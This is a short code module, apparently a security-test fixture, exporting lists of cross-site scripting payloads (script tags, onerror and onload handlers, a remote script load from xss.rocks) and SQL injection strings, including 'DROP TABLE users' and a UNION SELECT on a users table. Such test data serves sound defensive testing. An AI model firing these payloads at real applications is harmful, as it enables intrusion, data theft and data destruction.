export const XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    '<img src="x" onerror="alert(\'xss\')">',
    '<svg/onload=alert("xss")>',
    '"><script>alert("xss")</script>',
    '`-alert("xss")-`',
    '\'-alert("xss")-\'',
    '*/alert("xss")/*',
    '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
    '<IMG SRC="javascript:alert(\'XSS\');">',
    '<IMG SRC=javascript:alert(\'XSS\')>',
];

export const SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT * FROM users --",
    "'; DROP TABLE users --",
    "' OR 1=1 --",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "' HAVING 1=1 --",
    "' GROUP BY columnnames having 1=1 --",
    "'; INSERT INTO users VALUES ('hacked') --",
]; 